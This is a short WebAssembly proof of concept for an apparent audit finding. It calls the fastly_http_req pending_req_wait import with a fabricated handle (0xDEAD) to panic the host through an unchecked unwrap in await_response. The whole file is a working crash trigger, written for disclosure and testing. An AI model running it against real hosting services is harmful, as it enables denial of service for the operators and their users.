;; PoC for finding 014: Invalid pending request handle panics await_response
;;
;; In src/component/compute/http_req.rs:126, await_response calls
;; take_pending_request(h).unwrap(). A stale or fabricated pending request
;; handle causes a host panic.
;;
;; Trigger: serve this module and send any HTTP request.
;; Expected: host panic when pending_req_wait is called with a bogus handle.

(module
  (import "fastly_http_req" "pending_req_wait"
    (func $pending_req_wait (param i32 i32 i32) (result i32)))

  (memory (export "memory") 1)

  (func (export "_start")
    ;; Wait on a completely bogus pending request handle
    (call $pending_req_wait
      (i32.const 0xDEAD)  ;; invalid pending request handle
      (i32.const 100)     ;; resp_handle_out
      (i32.const 200)     ;; body_handle_out
    )
    drop
  )
)
